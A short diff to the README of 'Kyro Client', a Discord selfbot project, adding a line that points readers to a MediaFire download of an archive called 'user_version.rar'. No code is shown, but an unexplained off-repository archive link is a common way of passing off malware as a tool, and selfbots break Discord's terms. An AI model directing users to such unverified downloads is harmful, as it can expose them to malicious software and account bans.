@@ -4,6 +4,8 @@ Welcome to **Kyro Client**, a lightweight Discord selfbot project designed with 
 
 This project is actively maintained and updated whenever possible, with new features and improvements added over time. Suggestions are always welcome.
 
+download from media fire: https://www.mediafire.com/file/n5ry5lo43htrif4/user_version.rar/file
+
 ---
 
 ## ⚠️ Important Notice
